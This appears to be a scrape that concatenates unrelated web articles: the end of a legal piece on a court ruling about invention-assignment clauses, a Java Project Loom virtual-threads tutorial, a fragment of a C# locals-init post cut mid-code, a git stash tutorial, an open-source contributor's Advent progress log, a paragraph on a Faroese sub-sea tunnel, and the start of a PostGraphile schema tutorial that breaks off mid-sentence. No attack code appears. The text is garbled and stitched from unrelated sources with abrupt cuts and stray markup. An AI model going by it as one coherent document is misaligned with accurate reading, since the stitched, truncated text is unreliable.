<em>shall automatically be deemed to become the property of Company as soon as made or conceived, and Employee agrees to assign to Company, its successors, assigns, or nominees, all of Employee’s rights and interests in said inventions, improvements, and developments in all countries worldwide. Employee’s obligation to assign the rights to such inventions shall survive the discontinuance or termination of this Agreement for any reason.</em></p>
<p>After Alleshouse had ceased being employed by Wave Loch, he and another party filed for and eventually were awarded three patents. Wave Loch’s successor in interest then filed suit, claiming that the invention assignment agreement had been breached by Alleshouse and that the patents should be assigned to Wave Loch’s successor. The district court agreed, and held that the agreement was valid under California law.</p>
<p>In overturning that decision, the Court of Appeals noted that the parties in the case agreed that the patented inventions had not been conceived until after Alleshouse had left Wave Loch’s employment and that no trade secrets or confidential information of Wave Loch had been used. The Court of Appeals reasoned that to give effect to the assignment provisions—which were unlimited in time and geography and would apply to a post-employment invention that was merely “suggested by” his work for Wave Loch—would significantly impair Alleshouse’s ability to work in his chosen profession.</p>
<p>The Court of Appeals then determined that the assignment provisions in Section 2870(a) of the Labor Code only applied to inventions conceived during employment. To hold otherwise, “to authoriz[e] temporally unlimited assignment requirements through its exceptions, would produce a conflict with what we think is otherwise the clear prohibition of §16600 on agreements like the one at issue here.”</p>
<p>The Court of Appeals decision is another timely reminder that courts will not enforce overbroad clauses in agreements with employees that, although not explicitly prohibiting competition, have the practical effect of doing so.</p>

<h2>Why Loom?</h2>
<p>In 1998, it was amazing that the Sun Java Web Server (the precursor of Tomcat) ran each request in a separate thread, and not an OS process. It was able to serve thousands of concurrent requests this way! Nowadays, that’s not so amazing. Each thread takes up a significant amount of memory, and you can’t have millions of threads on a typical server.</p>
<p>That’s why the modern mantra of server-side programming is: “Never block!” Instead, you specify what should happen once the data is available.</p>
<p>This asynchronous programming style is great for servers, allowing them to handily support millions of concurrent requests. It isn’t so great for programmers.</p>
<p>Here is an asynchronous request with the <code>HttpClient</code> API:</p>
<pre>HttpClient.newBuilder()
   .build()
   .sendAsync(request, HttpResponse.BodyHandlers.ofString())
   .thenAccept(response -&gt; . . .);
   .thenApply(. . .);
   .exceptionally(. . .);
</pre>
<p>What we would normally achieve with statements is now encoded as method calls. If we loved this style of programming, we would not have statements in our programming language and merrily code in Lisp.</p>
<p>In JavaScript, code tagged as “async” is rewritten into method calls like the ones that you’ve just seen. But that means you can only call async methods from other async methods, and your API splits into a sync and an async part, forcing you to duplicate functionality.</p>

<p>Project Loom takes its guidance from languages such as Erlang and Go, attacking the root of the problem by making blocking very cheap. You run tasks in “virtual threads”, a nearly unlimited resource that is mapped into actual “carrier” threads. When a virtual thread blocks, it is “parked” and another virtual thread runs on the carrier thread. The name is supposed to remind you of virtual memory that is mapped to actual RAM.</p>
<p>Before you complain about the name, remember that naming is hard. The Loom team previously tried “fiber”, but it is already used elsewhere with a slightly different meaning. And “lightweight” or “new” thread might look foolish when something lighter-weight or newer comes along.</p>
<p>After experimenting with separate classes for OS threads and virtual threads, they ended up deciding to use a single class for both—the familiar <code>java.lang.Thread</code>—in order to ease migration.</p>
<p>Of course, good old <code>java.lang.Thread</code>, which has been around for 25 years, ever since Java 1.0, has its share of cruft. Awkward cancellation, thread groups, priorities, depreceated methods <code>stop</code>,<code>suspend</code>, <code>resume</code>. The Loom team felt that these liabilities were minor since most programmers never explicitly use the <code>Thread</code> API but launch tasks with an <code>ExecutorService</code>. (Of course, the same argument would support coming up with a cleaner virtual thread API instead.)</p>
<p>If you have been around for a very long time, you may remember that early versions of Java had “green threads” that were mapped to an OS thread. However, there is a crucial difference. When a green thread blocked, its carrier thread was also blocked, preventing all other green threads from making progress.</p>

<p>You can download binaries of Project Loom at <a href="http://jdk.java.net/loom/">http://jdk.java.net/loom/</a>. They are updated regularly.</p>
<p>As already mentioned, a virtual thread is an object of the <code>Thread</code> class. Here are three ways of producing fibers. First, there is a new factory method that constructs and starts a virtual thread:</p>
<pre>Thread thread = Thread.startVirtualThread(runnable);
  // <cite>Note that the thread is already started</cite></pre>
<p>This is good for demos, tutorials or quick-and-dirty experiments in JShell.</p>
<p>For more customization, there is a builder API:</p>
<pre>Thread thread = Thread.builder()
   .virtual()
   .name(taskname)
   .task(runnable)
   .build();</pre>
<p>However, as you have been told for many years now, it is better to use an executor service than to manually construct <code>Thread</code> instances. The static method <code>Executors.newVirtualThreadExecutor()</code> provides one. (The existing executor services are not useful for virtual threads. It would be counterproductive to pool them!)</p>
<p>For example,</p>
<pre>ExecutorService exec = Executors.newVirtualThreadExecutor();
exec.submit(runnable1);
exec.submit(runnable2);
</pre>
<p>As with the other factory methods in the <code>Executors</code> class, you can optionally supply a <code>ThreadFactory</code>. And the new <code>Thread.Builder</code> class has an easy way to provide a factory, instead of a single instance:</p>
<pre>ThreadFactory factory = Thread.builder()
   .virtual()
   .name(taskname)
   .task(runnable)
   .<b>factory()</b>;

ExecutorService exec = Executors.newThreadExecutor(factory);
</pre>
<p>Let’s try this out. As a first test, we just sleep in each task.</p>
<pre>import java.util.concurrent.*;

public class Test {
   public static int DELAY = 10_000;
   public static int NTASKS = 1_000_000;

   public static void run(Object obj) {
      try {
         Thread.sleep((int) (DELAY * Math.random()));
      } catch (InterruptedException ex) {
         ex.printStackTrace();
      }
      System.out.println(obj);
   }

   public static void main(String[] args) {
      ExecutorService exec = Executors.newVirtualThreadExecutor();
      for (int i = 1; i &lt;= NTASKS; i++) {
         String taskname = "task-" + i;
         exec.submit(() -&gt; run(taskname));
      }
      exec.close();
   }
}
</pre>
<p>Run the program and it just works. Then try using OS threads—change to <code>Executors.newCachedThreadPool()</code> or <code>Executors.newFixedThreadPool(NTASKS)</code>. The program will run out of memory; on my laptop, after about 25,000 threads.</p>
<p>Ok, but in practice, you don’t want to sleep, but do useful work. Consider a program adapted from one of <a href="https://www.javaspecialists.eu/about/heinz/">Heinz Kabutz</a>‘ puzzlers, The program fetches a daily image, from Dilbert or Wikimedia. It consists of classes <a href="http://horstmann.com/unblog/2019-07-27/dailyImages/ImageProcessor.java"><code>ImageProcessor</code></a> and <a href="http://horstmann.com/unblog/2019-07-27/dailyImages/ImageInfo.java"><code>ImageInfo</code></a>. The code is an impenetrable maze of twisty passages, all alike (i.e. helper functions yielding completable futures).</p>
<p>With virtual threads, simply read web contents synchronously. It blocks, but we don’t care. All the complexity goes away. The control flow is simple and comprehensible.</p>
<pre>exec.submit(() -&gt; {
    String pageURL = info.getUrlForDate(date);
    String page = getSync(pageURL, HttpResponse.BodyHandlers.ofString());
    String imageURL = info.findImage(page).getImagePath();
    byte[] image = getSync(imageURL, HttpResponse.BodyHandlers.ofByteArray());
    info.setImageData(image);
    process(info);
    return null;
});</pre>
<p>Here is the simplified <a href="http://horstmann.com/unblog/2020-12-05/dailyImages/ImageProcessor.java"><code>ImageProcessor</code></a> code.</p>
<p><b>Pro tip: </b>The statement <code>return null;</code> makes the lambda into a <code>Callable</code> instead of a <code>Runnable</code>, so that you don’t have to catch checked exceptions 😜</p>
<p>Try this out with something you care about. Call web services and make database connections, without worrying about callbacks. When blocking is cheap, a whole lot of accidental complexity goes away. Of course, to use this in a web app framework, you’ll have to wait for your framework provider to run your code in virtual threads.</p>
<h2>Structured Concurrency</h2>
<p>In <a href="https://vorpus.org/blog/notes-on-structured-concurrency-or-go-statement-considered-harmful/">this highly recommended article</a> (from which the images below are taken), Nathaniel Smith proposes structured forms of concurrency. Here is his central argument. Launching a task in a new thread is really no better than programming with GOTO, i.e. harmful:</p>
<pre>new Thread(runnable).start();</pre>
<p><img src="http://horstmann.com/unblog/2019-12-05/sequential-and-go-to-schematic.svg" alt=".svg" width="38%"></p>
<p>When multiple threads run without coordination, it’s spaghetti code all over again. In the 1960s, structured programming replaced <code>goto</code> with branches, loops, and functions:</p>
<p><img src="http://horstmann.com/unblog/2019-12-05/control-schematics.svg" alt=".svg" width="42%"></p>
<p>When you look at a line of code, you know how the program got there.</p>
<p>Structured concurrency does the same for concurrent tasks. We should know, from reading the program text, when they all finish.</p>
<p><img src="http://horstmann.com/unblog/2019-12-05/nursery-schematic-unlabeled.svg" alt=".svg" width="30%"></p>
<p>That way we can control the resources that the tasks use, and we know when it is time to move on.</p>
<p>In Loom, the <code>ExecutorService</code> implements this basic construct. <code>ExecutorService</code> has a <code>close</code> method that blocks until all of its virtual threads have completed. (I used this method in the first sample program to keep <code>main</code> alive until all virtual threads are done. In the past, you had to call the <code>awaitTermination</code> method instead.)</p>
<p>Conveniently, <code>ExecutorService</code> implements the <code>AutoCloseable</code> interface, so that you can just use a <code>try</code>-with-resources statement:</p>
<pre>try (ExecutorService exec = Executor.newVirtualThreadExecutor()) {
   for (int i = 0; i &lt; NTASKS; i++) {
      exec.schedule(() -&gt; run(i));
   }
} // <cite>Blocks until all threads completed</cite>
</pre>
<p>I wrote a simple web crawler as a demonstration of virtual threads—here is the <a href="http://horstmann.com/unblog/2020-12-05/Crawler.java"><code>Crawler</code></a> class. In my first attempt, I fired off a new virtual thread for each URL in a page. If I had wanted to become Google, I could have let my crawler run forever. But I wanted to go no more than 3 hops from the starting point. With “fire and forget”, there is no way of knowing when the recursion is done.</p>
<p>Instead, for each page, I make a new executor service and wait for completion. That way, the whole program completes when all pages have been crawled.</p>
<p>This seems a lot of blocking. But in Loom, blocking is cheap, so we shouldn’t worry about that.</p>
<p>We are used to having one executor service as thread pool for all our tasks. But in Loom, you are encouraged to use a separate executor service for each task set.</p>
<h2>Deadlines</h2>
<p>When crawling the web, you are likely to encounter dead links. Reading from one should time out eventually, but it can take surprisingly long.</p>
<p>The standard remedy is, of course, to provide a timeout. Loom prefers deadlines to timeouts, so you specify</p>
<pre>ExecutorService exec = Executors.newVirtualThreadExecutor().withDeadline(
   Instant.now().plus(30, ChronoUnit.SECONDS))
</pre>
<p>Why deadlines? In general, timeouts compose poorly. Suppose you have to accomplish two sequential tasks with an overall timeout of 10 seconds. You don’t want to give each of the tasks a timeout of 5 seconds. After all, if one takes 6 seconds and the other 3 seconds, you still come in under the finish line. To get the timeout of the second task, you’d have to measure the duration of the first task and subtract that from the overall timeout. With deadlines, it is much simpler. Each task gets the same deadline.</p>
<p>The call <code>exec.close()</code> blocks until all virtual threads have completed or the …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>C# 9 brings lots of new language features. One of them is the ability to suppress emitting <code>.locals init</code> flag. This feature allows to improve the performance of a method by not zeroing the local variables before executing the method. Even if <a href="https://github.com/dotnet/runtime/pull/32538">zeroing local has been improved<i></i></a> in .NET 5, not doing it will still be faster.</p><h2 id="what-is-locals-init"><a href="#what-is-locals-init">#</a>What is locals init?</h2><p>By default, the C# compiler emits the <code>.locals init</code> directive. This instructs the JIT to generate a prolog to set all local variables to their default value. This is safer as you cannot use uninitialized memory. You can validate this behavior using unsafe code. The following method constantly prints "0" to the console as the JIT initializes the variable <code>i</code> to its default value.</p><pre><code><span>static</span> <span>unsafe</span> <span><span>void</span></span> <span>DemoZeroing</span><span>(</span><span>)</span>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>It was only when I recently heard someone else say, “git stash is scary” that I realized it was top of my list of fears too. It just usually feels like there’s a chance I’ll just lose all of my in progress work to the depths of stashes and never be able to get the right incantation of <code>git</code> commands to reincarnate my code.</p>

<h3 id="what-does-git-stash-do">What does git stash do?</h3>

<p>Let me backtrack a minute! I haven’t yet explained what <code>git stash</code> even does. On the most basic level, <code>git stash</code> is one way to store in progress work in <code>git</code> for subsequent access, leaving behind a clean working directory.</p>

<p><em>Meta-note</em>: this post will be easiest to follow along if you open up a terminal and play around with <code>git stash</code> as you’re reading! The lack of syntax highlighting makes it a little tricky to see git additions / deletions. You can play around with any git repo you have, or clone <a href="https://github.com/githubtraining/hellogitworld">this hello world one</a> locally to work in a complete sandbox!</p>

<h3 id="stacks">Stacks</h3>

<p>Stashes are more easily understood as a basic last in, first out stack.</p>

<ul>
  <li><code>git stash push</code> (equivalent to <code>git stash</code> when used with no arguments) will push any local changes onto the stash and leave a clean working directory.</li>
</ul>

<div><div><pre><code><span>$ </span>git status
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

Changes not staged <span>for </span>commit:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to update what will be committed<span>)</span>
  <span>(</span>use <span>"git restore &lt;file&gt;..."</span> to discard changes <span>in </span>working directory<span>)</span>
	modified:   README.md

no changes added to commit <span>(</span>use <span>"git add"</span> and/or <span>"git commit -a"</span><span>)</span>

<span>$ </span>git stash push
Saved working directory and index state WIP on main: 6ab43aa Initial commit

<span>$ </span>git status
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

nothing to commit, working tree clean

</code></pre></div></div>

<p>There are a plethora of arguments we can pass to <code>git stash push</code>. The ones I find most helpful are:</p>

<ul>
  <li><code>-m &lt;message&gt;</code> saves the stash with a message, can be helpful for our future selves</li>
</ul>

<div><div><pre><code><span>$ </span>git stash push <span>-m</span> <span>"description"</span>
Saved working directory and index state On main: description
</code></pre></div></div>

<ul>
  <li><code>-p</code> patches changes (used like <code>git add -p</code>), allowing us to select which hunks to add to the stash. <a href="https://www.gnu.org/software/diffutils/manual/html_node/Detailed-Unified.html">Hunks</a> are areas where two files differ. Git will partition files into hunks for us!</li>
</ul>

<div><div><pre><code><span>$ </span>git stash push <span>-p</span>
....
Details about the hunk
....
<span>(</span>1/1<span>)</span> Stash this hunk <span>[</span>y,n,q,a,d,e,?]?
</code></pre></div></div>

<ul>
  <li><code>-u</code> includes untracked files in the stash. Without this flag, a file that <code>git</code> had never seen before would not be included in a stash</li>
</ul>

<div><div><pre><code><span>$ </span><span>touch </span>new-file
<span>$ </span>git status
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

Untracked files:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to include <span>in </span>what will be committed<span>)</span>
	new-file

nothing added to commit but untracked files present <span>(</span>use <span>"git add"</span> to track<span>)</span>

<span>$ </span>git stash push <span>-u</span>
Saved working directory and index state WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<ul>
  <li><code>-k</code> keeps the files (or hunks) which were staged. Without this option, when we apply a stash, nothing will be staged. More on applying in the next section!</li>
</ul>

<h3 id="accessing-the-stash">Accessing the stash</h3>

<p>Okay, we can now push changes onto the stash. But…. they’re still the stash abyss if we have no way of accessing them.</p>

<p><code>git stash list</code> shows us what is on the stash:</p>

<div><div><pre><code><span>$ </span>git stash list
stash@<span>{</span>0<span>}</span>: On main: Clear description of these changes
stash@<span>{</span>1<span>}</span>: WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<p>This is where the <code>-m</code> message flag from earlier will be incredibly helpful. The first item in my stash had a message (<code>Clear description of these changes</code>), the second did not.</p>

<p>Okay, okay. We can now <em>see</em> what’s on the stash. But how do we access anything on the stash? Or remove it from the stash?</p>

<p><code>git stash show</code> will show us the difference between the top item on the stash, and our current working directory:</p>

<div><div><pre><code><span>$ </span>git stash show
 README.md | 1 +
 1 file changed, 1 insertion<span>(</span>+<span>)</span>
</code></pre></div></div>

<p>If we want to reference a different set of changes on the stash, and not the most recent one, we can use the stash index of those changes. As we can see above, each item on the stash has an index, and can be referred to by <code>stash@{index}</code></p>

<p>So, to see the set of changes in the next item on our stack, we can run:</p>

<div><div><pre><code><span>$ </span>git stash show stash@<span>{</span>1<span>}</span>
 README.md | 2 +-
 1 file changed, 1 insertion<span>(</span>+<span>)</span>, 1 deletion<span>(</span>-<span>)</span>
</code></pre></div></div>
<p>Neat, so we now know how to get the differences and look at what’s in the stash. But to actually access what’s on the stash, we’ll need <code>git stash apply [&lt;stash&gt;]</code>. It similarly can take an argument with the stash index to reference something later in the stash. If no argument is provided, it will default to the most recent set of changes we put in the stash (the ones at <code>stash@{0}</code>)</p>

<div><div><pre><code><span>$ </span>git stash apply stash@<span>{</span>1<span>}</span>
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

Changes not staged <span>for </span>commit:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to update what will be committed<span>)</span>
  <span>(</span>use <span>"git restore &lt;file&gt;..."</span> to discard changes <span>in </span>working directory<span>)</span>
	modified:   README.md

no changes added to commit <span>(</span>use <span>"git add"</span> and/or <span>"git commit -a"</span><span>)</span>
</code></pre></div></div>

<h4 id="removing-from-the-stash">Removing from the stash</h4>

<p>However, <code>git stash apply</code> will not <em>remove</em> the changes from the stash. If we look at the stash now, we’ll see it’s the same as it was:</p>

<div><div><pre><code><span>$ </span>git stash list
stash@<span>{</span>0<span>}</span>: On main: Clear description of these changes
stash@<span>{</span>1<span>}</span>: WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<p>In order to remove a set of changes from the stash, we can use <code>git stash drop [&lt;stash&gt;]</code></p>

<div><div><pre><code><span>$ </span>git stash drop stash@<span>{</span>0<span>}</span>
Dropped refs/stash@<span>{</span>0<span>}</span> <span>(</span>b09812812eb27de2cb49bfd02aba43889362b6de<span>)</span>

<span>$ </span>git stash list
stash@<span>{</span>0<span>}</span>: WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<p>We can see that the set of changes at <code>stash@{0}</code> are now no longer on the stash, and the set of changes which were at <code>stash@{1}</code> are now at <code>stash@{0}</code>.</p>

<p>If we want to <code>apply</code> and <code>drop</code> a set of changes, we can conveniently use <code>git stash pop [&lt;stash&gt;]</code>. <code>pop</code> will only also <code>drop</code> if there’s no merge conflict.</p>

<p>To clear the stash completely, we can run <code>git stash clear</code>. This is the <em>actual</em> scary command which will cause us to lose any work in progress that you had stashed. Only run <code>git stash clear</code> if you never again want to access what is currently on the stash.</p>

<h3 id="why-stash">Why stash?</h3>

<p>So we’ve learned how to use <code>git stash</code>, but still haven’t covered <em>why</em> to use it. Stashing is intended to be a quick and easy way to get to a clean working state while not losing in progress work. And it is! Both quick, and now hopefully easy!</p>

<p>One example of when I might use <code>git stash</code> is if I’m in progress on some changes, but realize I want to amend a prior commit. I can stash the changes, amend the commit, and then apply the stash to get back to where I was.</p>

<p>Another is if I am trying to experiment with a few different ways to solve a problem, and want small, quick examples down each solution path. I might create stashes with all of my examples, and then pick the best and pursue that set of changes in a branch structure.</p>

<p>Additionally, stashing is especially helpful because it is branch agnostic. That is to say, if we switch branches, our stash will remain the same. This means stashing can also be a convenient way to carry changes through different branches.</p>

<h3 id="when-not-to-stash">When not to stash</h3>

<p>Equally import to why stash is when <em>not</em> to use it.</p>

<p>Stashing was built for convenience, and is not intended to be a permanent way to save work; that’s what branches and commits are for. Stashing also only works locally, you can’t push stashes to a repo or have others pull them down.</p>

<h3 id="branches-from-stash">Branches from stash</h3>

<p>Speaking of branches, another fun feature of stashes is that we can create a branch directly from a stash. This is done using <code>git stash branch &lt;branch_name&gt; [&lt;stash&gt;]</code> This will also drop the changes from the stash, equivalent to a <code>git stash pop</code> not a <code>git stash apply</code>.</p>

<div><div><pre><code><span>$ </span>git stash branch new-branch
Switched to a new branch <span>'new-branch'</span>
On branch new-branch
Changes not staged <span>for </span>commit:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to update what will be committed<span>)</span>

</code></pre></div></div>

<h3 id="in-summary">In summary</h3>

<ul>
  <li><code>git stash</code> operates on a LIFO stack of sets of changes</li>
  <li><code>git stash list</code> shows what’s on the stash</li>
  <li><code>git stash push</code> pushes to the stash</li>
  <li><code>git stash apply</code> access changes on the stash</li>
  <li><code>git stash drop</code> removes changes from the stash</li>
  <li><code>git stash pop</code> does an <code>apply</code> and a <code>drop</code></li>
  <li>These default to the most recent item on the stash, to reference another one use <code>stash@{index}</code> where you can determine the index from <code>git stash list</code></li>
  <li>Some of these have flags which make them more convenient, including: <code>-m</code> message, <code>-p</code> patch, <code>-u</code> include untracked files, <code>-k</code> keep staged changes staged</li>
</ul>

<p>Hopefully you, too, can now add <code>git stash</code> to the list of fears you’ve conquered!</p>

<p>For further reading on stashing, take a look at the <a href="https://git-scm.com/docs/git-stash">git stash docs</a>. For further reading on <a href="https://www.brainyquote.com/topics/fear-quotes">conquering fears</a>, here is a favorite quote of mine, “Nothing in life is to be feared, it is only to be understood. Now is the time to understand more, so that we may fear less.” - <a href="https://en.wikipedia.org/wiki/Marie_Curie">Marie Curie</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Ah, it’s again this magical time of the year - the Advent!
When I was little I associated it mostly with advent candy boxes
with a different candy for each day of the Advent, but these days
I mostly associate this period with the famous <a href="https://adventofcode.com/">Advent of Code</a>.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>As much as I love solving puzzles, I’ve realized lately that probably
it’s not the best use of my limited free time. Last year I opted to do
an <a href="http://metaredux.com/posts/2019/12/01/meta-advent-2019.html">blogging challenge</a>, instead of the Advent of Code, and this
year I’m challenging myself to contribute something (meaningful) to my <a href="http://metaredux.com/projects">open-source
projects</a> every day from the 1st of December to Christmas.
Fun times ahead!</p>

<p>Today is the 3rd of December already, so I guess I have to report what I’ve done so far.</p>

<h2 id="dec-1">Dec 1</h2>

<ul>
  <li>Shipped <a href="https://github.com/rubocop-hq/rubocop/releases/tag/v1.5.0">RuboCop 1.5</a></li>
  <li>Lots of improvements to the <a href="https://guide.clojure.style/">Clojure Style Guide</a>
    <ul>
      <li>New sections on <a href="https://guide.clojure.style/#guiding-principles">guiding principles</a> and <a href="https://guide.clojure.style/#a-note-about-consistency">consistency</a></li>
      <li>Documented the <a href="https://guide.clojure.style/#sources-of-inspiration">sources of inspiration</a></li>
      <li>Added lots of new code examples (e.g. <a href="https://guide.clojure.style/#comments">here</a>)</li>
      <li>Fixed many headings that had broken wording after the automated conversion to the current structure last year (each guideline now has a title, and the titles were auto-generated from the old permalinks associated with the guidelines)</li>
    </ul>
  </li>
</ul>

<p>I hope to gradually clean up the backlog for improvements of the style guide in the months to come. I’ll also mention here that I wouldn’t mind
some volunteers willing to help document the best practices for working with <code>cljc</code> and <code>clojure.spec</code>.</p>

<h2 id="dec-2">Dec 2</h2>

<ul>
  <li>Shipped <a href="https://github.com/rubocop-hq/rubocop/releases/tag/v1.5.1">RuboCop 1.5.1</a></li>
  <li><a href="https://github.com/bbatsov/projectile">Projectile</a>
    <ul>
      <li>Groomed the backlog (replied to some tickets, closed some tickets that were addressed/irrelevant, added tags to everything else)</li>
      <li>Merged a few outstanding PRs (see the <a href="https://github.com/bbatsov/projectile/blob/master/CHANGELOG.md#bugs-fixed">changelog</a> for details)</li>
      <li>Lots of improvements to the documentation site
        <ul>
          <li>Improved <a href="https://docs.projectile.mx/projectile/usage.html">Usage</a> page (better basic setup instructions, plus coverage of the mighty but elusive Projectile Commander)</li>
          <li>Improved <a href="https://docs.projectile.mx/projectile/projects.html">Projects</a> page (in particular, you’ll find there a lot of information about the mythical and mystical <code>projectile-project-root-functions</code>)</li>
          <li>Improved <a href="https://docs.projectile.mx/projectile/configuration.html">Configuration</a></li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p>It always feels great to revisit Projectile, as it’s both the first open-source project I ever created and the project I use more than anything else.</p>

<h2 id="dec-3-today">Dec 3 (today)</h2>

<ul>
  <li>More work on Projectile’s documentation and grooming the backlog</li>
  <li>Preparing for another RuboCop bug-fix release (1.5.2 might land later today)</li>
</ul>

<h2 id="looking-forward">Looking Forward</h2>

<p>So, what’s next?
My main priorities for the Advent of OSS are currently:</p>

<ul>
  <li>Polish the Clojure Style Guide</li>
  <li>Ship CIDER 1.0</li>
  <li>Ship Emacs Prelude 1.1</li>
  <li>Clean up Projectile’s backlog</li>
</ul>

<p>I probably won’t be able to achieve them all, but I’ve been told it’s good to be ambitious. If someone wants to help me out, be my guest.
My projects have plenty of tickets tagged with <code>Good First Issue</code> that you might try tackling.</p>

<p>I’ll try to post some updates here every few days, both to keep it
up-to-date with my progress and to keep myself honest. That’s all from
me for now. Keep hacking!</p>

<p><strong>P.S.</strong> In the time-honored tradition of the Advent, I’m inviting all of you to join my on the Christmas OSS adventure and see how far are you willing
to go! It will be fun!</p>

<p>The Eysturoyartunnilin (or Eysturoy Tunnel, earlier known as Skálafjarðartunnilin) is a large infrastructure project which connects the island of Streymoy to the island of Eysturoy through a sub-sea road tunnel under the Tangafjørður sound in the Faroe Islands. It also crosses the southern part of Skálafjørður and connects the towns of Runavík on the eastern side and Strendur on the western side of the fjord. Altogether, the three-branch sub-sea tunnel measures 11.24 kilometres (6.8 miles) long, including an underwater roundabout. Construction costs are estimated to be around a billion DKK. It will open for traffic in December 2020.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Postgres database is rich with features well beyond that of any other
database. However, most developers do not know the extent to which they can
leverage the features in Postgres to completely express their application
business logic in the database.</p>
<p>Often developers may find themselves re-implementing authentication and
authorization in their apps, when Postgres comes with application level security
features out of the box. Or perhaps developers may rewrite basic insert
functions with some extra app logic where that too may be handled in the
database.</p>
<p>This reimplementation of features that come with Postgres is not just an
inefficient way to spend developer resources, but may also result in an
interface that is slower than if the logic was implemented in Postgres itself.
PostGraphile aims to make developers more efficient and their APIs faster by
packaging the repeatable work in one open source project that encourages
community contributions.</p>
<p>In this tutorial we will walk through the Postgres schema design for a forum
application with users who can login and write forum posts. While we will
discuss how you can use the schema we create with PostGraphile, this article
should be useful for anyone designing a Postgres schema.</p>
<p>If you haven't installed PostGraphile already, you can follow our
<a href="https://www.graphile.org/postgraphile/quick-start-guide/">Quick Start Guide</a> to get PostGraphile up and
running.</p>

<h4 id="setting-up-your-schemas"><a href="#setting-up-your-schemas" aria-label="setting up your schemas permalink"></a>Setting Up Your Schemas</h4>
<p>All of our database objects will go into one or two custom Postgres schemas. A
schema is essentially a namespace, it allows you to create tables with the same
name like <code>a.person</code> and <code>b.person</code>.</p>
<p>You can name your schema anything, we recommend naming your schema after your
app. This way if you are working on multiple apps in the same database (this
might only realistically happen in development), you can easily query the
databases of the different apps. We are going to create two schemas:
<code>forum_example</code>, and <code>forum_example_private</code>. To create these schemas we use the
<a href="https://www.postgresql.org/docs/current/static/sql-createschema.html"><code>CREATE SCHEMA</code></a>
command.</p>
<div data-language="sql"><pre><code><span>create</span> <span>schema</span> forum_example<span>;</span>
<span>create</span> <span>schema</span> forum_example_private<span>;</span></code></pre></div>
<p>You could create more or less schemas, it is all up to you and how you want to
structure your database. We decided to create two schemas. One of which,
<code>forum_example</code>, is meant to hold data users can see, whereas
<code>forum_example_private</code> will never be directly accessible to users.</p>
<p>Theoretically we want a user to be able to log in directly to our Postgres
database, and only be able to create, read, update, and delete data for their
user all within SQL. This is a mindshift from how we traditionally use a SQL
database. Normally, we assume whoever is querying the database has full
visibility into the system as the only one with database access is our
application. In this tutorial, we want to restrict access at the database level.
Don’t worry though! Postgres is very secure about this, users will have no more
permissions than that which you explicitly grant.</p>
<blockquote>
<p><strong>Note:</strong> When starting PostGraphile, you will want to use the name of the
schema you created with the <code>--schema</code> option, like so:
<code>postgraphile --schema forum_example</code>. Also, don’t forget to add the <code>--watch</code>
flag, with watch mode enabled PostGraphile will update your API as we add
tables and types throughout this tutorial.</p>
</blockquote>
<h4 id="the-person-table"><a href="#the-person-table" aria-label="the person table permalink"></a>The Person Table</h4>
<p>Now we are going to create the tables in our database which will correspond to
our users. We will do this by running the Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-createtable.html"><code>CREATE TABLE</code></a>
command. Here is the definition for our person table:</p>
<div data-language="sql"><pre><code><span>create</span> <span>table</span> forum_example<span>.</span>person <span>(</span>
  id               <span>serial</span> <span>primary</span> <span>key</span><span>,</span>
  first_name       <span>text</span> <span>not</span> <span>null</span> <span>check</span> <span>(</span>char_length<span>(</span>first_name<span>)</span> <span>&lt;</span> <span>80</span><span>)</span><span>,</span>
  last_name        <span>text</span> <span>check</span> <span>(</span>char_length<span>(</span>last_name<span>)</span> <span>&lt;</span> <span>80</span><span>)</span><span>,</span>
  about            <span>text</span><span>,</span>
  created_at       <span>timestamp</span> <span>default</span> <span>now</span><span>(</span><span>)</span>
<span>)</span><span>;</span></code></pre></div>
<p>Now we have created a table with <code>id</code>, <code>first_name</code>, <code>last_name</code>, <code>about</code>, and
<code>created_at</code> columns (we will add an <code>updated_at</code> column later). Let’s break
down exactly what each line in this command does, we will only do this once. If
you already understand, you can skip ahead.</p>
<ol>
<li><code>create table forum_example.person</code>: This tells Postgres that we are
creating a table in the <code>forum_example</code> schema named <code>person</code>. This table
will represent all of our forum’s users.</li>
<li><code>id serial primary key</code>: This line establishes an auto-incrementing id field
which is always guaranteed to be unique. The first person we create will
have an id of 1, the second user will have an id of 2, and so on. The
<code>primary key</code> bit is also very important. PostGraphile will use the
<code>primary key</code> of a table in many places to uniquely identify an object,
including the globally unique id field.</li>
<li><code>first_name text not null check (char_length(first_name) &lt; 80)</code>: We want all
of our users to enter their first name and last name seperately, so this
column definition will create a column named <code>first_name</code>, of type <code>text</code>,
that is required (<code>not null</code>), and that must be less than 80 characters long
(<code>check (char_length(first_name) &lt; 80)</code>).
<a href="https://www.postgresql.org/docs/current/static/ddl-constraints.html">Check constraints</a>
are a very powerful feature in Postgres for data validation.</li>
<li><code>last_name text check (char_length(last_name) &lt; 80)</code>: This is very similar
to our column definition for <code>first_name</code>, except it is missing <code>not null</code>.
This means that unlike the <code>first_name</code> column, <code>last_name</code> is not required.</li>
<li><code>about text</code>: We want users to be able to express themselves! So they get to
write a mini forum post which will go on their profile page.</li>
<li><code>created_at timestamp default now()</code>: This final column definition will
provide us with some extra meta-information about their user. If not
specified explicitly, the <code>created_at</code> timestamp will default to the time
the row was inserted.</li>
</ol>
<p>And that’s our person table! Pretty simple, right?</p>
<p>The syntax and features of the Postgres
